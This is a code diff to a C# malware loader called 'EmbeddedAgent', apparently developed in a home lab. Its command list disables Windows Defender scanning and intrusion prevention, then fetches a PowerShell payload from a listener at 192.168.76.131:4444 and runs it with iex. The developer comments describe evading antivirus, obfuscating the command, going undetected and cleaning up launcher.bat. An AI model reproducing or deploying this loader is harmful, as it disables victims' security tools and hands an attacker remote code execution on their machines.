@@ -40,8 +40,11 @@ namespace EmbeddedAgent
         }
 
         /*
-        * TODO test cases
+        * IDEAS:
+        * -------
         *I have to figure out why now the av doesn't let me disable it and run my command
+        *Watch hackersploit for obfuscation of my powershell command
+        *Also try to return to the previous snapshot, to really recreate a real environnement where I would be interacting with the machine for the first time
         */
         public static List<string> InitCommands()
         {
@@ -61,14 +64,13 @@ namespace EmbeddedAgent
                 "Set-MpPreference -DisableArchiveScanning $True",
                 "Set-MpPreference -DisableScriptScanning $True",
                 "Set-MpPreference -DisableIntrusionPreventionSystem $True",
-                "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.76.131:4444/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex",
-                ".\\launcher.bat"
+                "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.76.131:4444/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex"
             }; ;
         }
 
         /*
-         * TODO test cases
-         * 
+         * TODO
+         * -----
          * So now, I know that even after i restart the win defender the malicious code does not detected, but there is one problem,
          * I cant figure out the time i have to wait to run the clean up commands, when waiting after the background worker, but the file launcher.bat always get deleted
          */
